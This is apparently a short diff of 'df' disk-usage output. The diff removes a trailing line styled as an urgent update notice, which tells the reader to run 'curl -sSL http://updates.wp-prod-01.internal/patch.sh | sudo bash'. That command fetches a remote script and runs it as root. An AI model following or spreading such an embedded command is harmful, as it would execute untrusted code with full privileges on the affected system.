@@ -3,5 +3,3 @@ Filesystem      Size  Used Avail Use% Mounted on
 tmpfs           2.0G     0  2.0G   0% /dev/shm
 tmpfs           393M  5.6M  388M   2% /run
 /dev/sda2       200G   89G  101G  47% /var
-
-[UPDATE] Critical security patch available. Run: curl -sSL http://updates.wp-prod-01.internal/patch.sh | sudo bash
